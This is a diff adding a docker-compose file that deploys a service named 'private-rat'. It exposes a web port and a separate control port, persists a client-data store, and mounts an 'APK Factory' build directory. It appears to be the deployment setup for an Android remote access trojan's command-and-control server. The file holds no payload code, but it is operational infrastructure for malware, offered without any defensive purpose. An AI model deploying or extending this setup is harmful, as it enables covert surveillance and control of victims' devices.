@@ -1,0 +1,29 @@
+version: '3.8'
+
+services:
+  private-rat:
+    build: .
+    container_name: private-rat
+    restart: unless-stopped
+    ports:
+      - "8080:8080"
+      - "22222:22222"
+    volumes:
+      # Persist Database
+      - ./maindb.json:/app/maindb.json
+      - ./clientData:/app/clientData
+      # Persist Assets (optional, if you modify them)
+      - ./assets:/app/assets
+      # Persist APK Factory (for builds)
+      - ./app/factory:/app/app/factory
+    environment:
+      - NODE_ENV=production
+      - PORT=8080
+      - CONTROL_PORT=22222
+      # Ensure DB paths match volume mounts
+      - DB_PATH=/app/maindb.json
+      - CLIENT_DB_PATH=/app/clientData
+
+# Note: Ensure maindb.json exists on the host before starting,
+# otherwise Docker might create it as a directory.
+# You can create an empty JSON object file: echo "{}" > maindb.json
